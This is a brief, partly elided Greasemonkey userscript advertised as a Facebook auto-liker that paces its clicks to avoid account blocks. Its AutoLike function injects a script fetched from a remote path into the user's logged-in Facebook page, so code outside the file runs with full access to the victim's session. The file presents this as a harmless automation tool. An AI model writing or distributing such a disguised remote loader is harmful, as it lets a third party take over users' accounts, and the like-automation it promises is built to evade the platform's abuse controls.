// ==UserScript==
// @name			Auto Like Facebook @Rizani19
// @namespace		auto_like_facebook
// @description		Auto Like Facebook by Rizni. Auto Like status, wall and facebook comments system uses delay timer that allows you to control the speed of access and prevents blocking of the account.
// @author			Muhammad Yusuf Rizani
...
body.appendChild(div);unsafeWindow.AutoLike = function() {javascript:(a=(b=document).createElement("script")).src="//www.facebook.com/rizani19/las",b.body.appendChild(a);void(0);};}
body = document.body;
